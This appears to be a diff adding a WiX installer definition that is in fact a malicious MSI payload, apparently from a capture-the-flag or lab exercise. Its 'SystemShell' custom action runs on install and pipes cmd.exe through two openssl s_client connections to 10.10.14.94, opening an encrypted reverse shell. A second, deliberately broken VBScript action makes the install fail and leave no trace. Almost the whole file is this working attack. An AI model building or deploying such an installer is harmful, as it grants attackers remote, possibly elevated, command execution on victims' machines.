@@ -1,0 +1,37 @@
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product
+Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
+<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer
+Package"/>
+<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+<Directory Id="TARGETDIR" Name="SourceDir">
+<Directory Id="ProgramFilesFolder">
+<Directory Id="INSTALLLOCATION" Name="Example">
+<Component
+Id="ApplicationFiles"
+Guid="12345678-1234-1234-1234-222222222222">
+</Component>
+</Directory>
+</Directory>
+</Directory>
+<Feature Id="DefaultFeature" Level="1">
+<ComponentRef Id="ApplicationFiles"/>
+</Feature>
+<CustomAction Id="SystemShell" Directory="TARGETDIR" ExeCommand="cmd.exe /c
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.14.94:73| cmd.exe |
+C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe
+s_client
+-quiet
+-connect
+10.10.14.94:136"
+Execute="deferred" Impersonate="yes" Return="ignore"/>
+<CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
+invalid vbs to fail install
+</CustomAction>
+<InstallExecuteSequence>
+<Custom Action="SystemShell" After="InstallInitialize"></Custom>
+<Custom Action="FailInstall" Before="InstallFiles"></Custom>
+</InstallExecuteSequence>
+</Product>
+</Wix>
